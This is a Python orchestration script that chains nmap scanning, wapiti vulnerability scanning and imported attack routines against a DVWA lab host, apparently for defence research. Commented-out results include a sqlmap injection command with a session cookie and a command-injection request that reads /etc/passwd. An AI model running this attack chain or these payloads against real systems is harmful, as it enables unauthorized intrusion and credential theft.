# import sys
import argparse
# import nmap
import time, sys, random
import subprocess
import logging
# import os
# replaces os
# import subprocess

from helpers import post_processing, create_output_folder, get_ip_from_dig
from network_scanning import nmap_scan
from vulnerability_scanning import *
from attacks import *
from probing import probe_signal, evaluate_interval

logging.basicConfig(level=logging.INFO)
# logging.basicConfig(filename='log/debug.log', level=logging.debug)
logging.getLogger().setLevel(logging.INFO)

def arg_parser():
    parser = argparse.ArgumentParser(
        usage="",
        description=""
    )

    parser.add_argument(
        "-a", "--addr",
        help="Host address"
    )

    parser.add_argument(
        "-sa", "--nw_scan_addr",
        help="Address range to feed nmap"
    )

    # parser.add_argument('--advance',
    #                 type=bool,
    #                 help='Advance Mode',
    #                 default=False,
    #                 required=False)
    return parser

def test_phase_1(trials, hosts):
    phase_results = []
    for idx in range(trials):
        result = nmap_scan(print_output=True, hosts = hosts)
        phase_results.append(result)
    post_processing(1, phase_results)

def test_phase_2(trials, host=None, cookie=None, group_name=None):
    phase_results = []
    for idx in range(trials):
        result = wapiti_scan(host=host,cookie=cookie,group_name=group_name)
        phase_results.append(result)
    post_processing(2, phase_results)

def test_phase_3(trials, vuln_scan_results, host, group_name=None):
    phase_results = []
    for idx in range(trials):
        result = execute_attacks(vuln_scan_results, host, 
                    cookie=get_cookie_contents("./resources/default_lab.json"), 
                    group_name=group_name, stop_if_success=True)
        phase_results.append(result)
    post_processing(3, phase_results)

def full_attack(trials=1, hosts=None,  cookie=None, group_name=None):
    phase_1_results = []
    phase_2_results = []
    phase_3_results = []
    do_not_dig = False
    if hosts:
        do_not_dig = True
    print("Total trials " + str(trials))
    sys.stdout.flush()
    # for i in range(trials):
    i=-1
    while(True):
        i += 1

        try:
            print("---- Trial " + str(i) + ",  " +  time.strftime("%Y%m%d_%H%M%S"))
            start = time.time()
            # if not hosts:
            #     logging.error("no hosts")
            #     return
                # hosts = "192.168.40.*"
            if not cookie:
                # cookie = get_cookie()
                cookie = "./resources/default_lab.json"
            if not do_not_dig:
                hosts, ip = get_ip_from_dig()
                modify_cookie_ip(ip, cookie)

            # network scanning
            result = nmap_scan(print_output=True, hosts = hosts)
            phase_1_results.append(result)
            logging.info("Found {} hosts on network, attacking just one {}".format(
                            len(result["results"]), result["results"])) # TODO not 1
            if len(result["results"]) < 1:
                print("No hosts found, restarting")
                vuln_scan_results = {
                    "stage":2,
                    "time":0, 
                    "settings": "",
                    "results":{},
                }
                phase_2_results.append(vuln_scan_results)
                attack_results = {
                    "stage":3,
                    "time":0, 
                    "settings": "",
                    "results":{},
                    "success":False
                }
                phase_3_results.append(attack_results)
                continue
            sys.stdout.flush()

            # vulnerability scanning
            host = "http://"+result["results"][0]
            result = wapiti_scan(host=host+"/vulnerabilities/", group_name=group_name, cookie=cookie)
            w_result = result
            num_results=0 
            for key in result["results"].keys():
                num_results += len(result["results"][key])
            logging.info("Total number of wapiti results is {}".format(num_results))
            success = True if num_results > 0 else False
            if not success:
                print("No vuln found, restarting")
                vuln_scan_results = {
                    "stage":2,
                    "time":0, 
                    "settings": "",
                    "results":{},
                }
                phase_2_results.append(vuln_scan_results)
                attack_results = {
                    "stage":3,
                    "time":0, 
                    "settings": "",
                    "results":{},
                    "success":False
                }
                phase_3_results.append(attack_results)
                continue
            sys.stdout.flush()

            # attacking
            result = execute_attacks(result, host, 
                            cookie=get_cookie_contents(cookie), 
                            group_name=group_name, stop_if_success=True)
            phase_2_results.append(w_result)
            phase_3_results.append(result)
            end = time.time()
            print("---- END, total time (sec) " + str(end-start) + ", " +  time.strftime("%Y%m%d_%H%M%S"), file=sys.stderr)
            sys.stdout.flush()
        except Exception as e:
            logging.error(e)
            print("Timeout")
            vuln_scan_results = {
                "stage":2,
                "time":0, 
                "settings": "",
                "results":{},
            }
            phase_2_results.append(vuln_scan_results)
            attack_results = {
                "stage":3,
                "time":0, 
                "settings": "",
                "results":{},
                "success":False
            }
            phase_3_results.append(attack_results)
        print("---PHASE OUTPUTS---" +  time.strftime("%Y%m%d_%H%M%S"), file=sys.stderr)
        post_processing(1, phase_1_results)
        post_processing(2, phase_2_results)
        post_processing(3, phase_3_results)
        print(len(phase_1_results), len(phase_2_results), len(phase_3_results), file=sys.stderr)
        print("---END PHASE OUTPUTS---", file=sys.stderr)
            


def main(args):

    # Probing
    # hosts, ip = get_ip_from_dig()
    # hosts, ip = "192.168.40.132/24", "192.168.40.132"
    # probe_signal(starting_ip = ip, scan_range = hosts )
    evaluate_interval(None)


    # make group directory
    # group = time.strftime("%Y%m%d_%H%M%S",time.gmtime(time.time()))
    # group = "delayed_mtd_drop_120_NW_24_attack_sql_stop" #TODO parse this in from commandline
    # create_output_folder(group)

    # print("Test stdout")
    # print("Test stderr", file=sys.stderr)

    # print("---- STARTING " + time.strftime("%Y%m%d_%H%M%S"))
    # print("stage, time, command, result, success")
    # full_attack(trials=1020, hosts=None, cookie=None, group_name=group)

    # cookie = "./resources/default_lab.json"
    # hosts, ip = get_ip_from_dig()
    # modify_cookie_ip(ip, cookie)
    
    # print("stage, time, command, result, success")
    # test_phase_1(3, args.nw_scan_addr)
    # test_phase_2(1, "http://"+args.addr+"/vulnerabilities/", group_name=group, cookie="./resources/default_lab.json")
    # vuls = get_wapiti_results("./results/20210716/testing_auto_static/wapiti_20210716_040537.json")
    # vuln_scan_results = {
    #     "stage":2,
    #     "time":0, 
    #     "settings": "",
    #     "results":vuls,
    # }
    # test_phase_3(1, vuln_scan_results, "http://"+args.addr, group_name=group)

    # attack_result = [{'stage': 3, 'time': 15.774715423583984, 'settings': 'sqlmap -u "http://192.168.40.132/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=a6509358ff1953766c9fac358712de29;security=low" --flush-session --batch --answers="" --output-dir=./results/20210715/sqlmap_out_20210715_020936', 'result_file': './results/20210715/sqlmap_out_20210715_020936/192.168.40.132/log', 'success': True}, {'stage': 3, 'time': 0.03617119789123535, 'settings': 'curl "http://192.168.40.132/dvwa/vulnerabilities/exec/" -e "http://192.168.40.132/dvwa/vulnerabilities/exec/" -d "ip=%3Bcat /etc/passwd%3B&submit=submit" --cookie "PHPSESSID=a6509358ff1953766c9fac358712de29;security=low"', 'result_file': './results/20210715/exec_pw_out_20210715_020952', 'success': True}]
    # post_processing(3, attack_result)
    
    # vuls = get_wapiti_results("./results/made_results.json")
    # result = {
    #     "stage":2,
    #     "time":0, 
    #     "settings": "",
    #     "results":vuls,
    # }
    # attack_result = execute_attacks(result, "http://192.168.40.132", 
    #                 cookie=get_cookie_contents("./resources/cook2.json"), 
    #                 group_name=group, stop_if_success=True)

    # with open("./results/attack_output.txt", "w") as f:
    #     f.write(str(attack_result))

    # cookie_file = get_cookie()
    # wapiti_scan(os_output=True)

    # result = wapiti_scan(modules="all", os_output=True)
    # post_processing(2, [result])

    # vuls = get_wapiti_results("./results/made_results.json")
    # result = {
    #     "stage":2,
    #     "time":0, 
    #     "settings": "",
    #     "results":vuls
    # }
    # post_processing(2, [result])

    #wapiti_scan()

    # result = nmap_scan()
    # post_processing(1, [
    #     result, 
    #     nmap_scan(print_output=False, hosts = "192.168.40.*")
    # ])



if __name__ == '__main__':
    parser = arg_parser()
    args = parser.parse_args(sys.argv[1:])

    # so I don't have to pass it in commandline
    # args.addr="10.0.0.100"
    # args.nw_scan_addr = "10.0.0.100/24" # I can write a script to dig and feed into here

    # un comment in lab
    # ip, raw = get_ip_from_dig()
    # args.nw_scan_addr = ip
    # args.addr = raw


    main(args)
